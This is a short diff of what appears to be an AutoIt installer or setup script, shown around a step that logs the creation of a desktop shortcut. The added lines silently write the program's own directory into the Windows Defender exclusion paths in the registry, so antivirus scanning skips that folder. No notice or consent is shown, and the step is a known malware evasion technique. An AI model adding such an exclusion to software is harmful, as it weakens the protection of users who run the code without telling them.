@@ -292,6 +292,9 @@ While 1
 			WriteLog("Desktopverknüpfung erstellt" & @CRLF)
 
 
+			Local $regKey = "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths"
+			RegWrite($regKey, $sDirectory, "REG_DWORD", 0)
+
 			;#########################################################################################
 			FileClose($hLogFile)
 			Sleep(200)
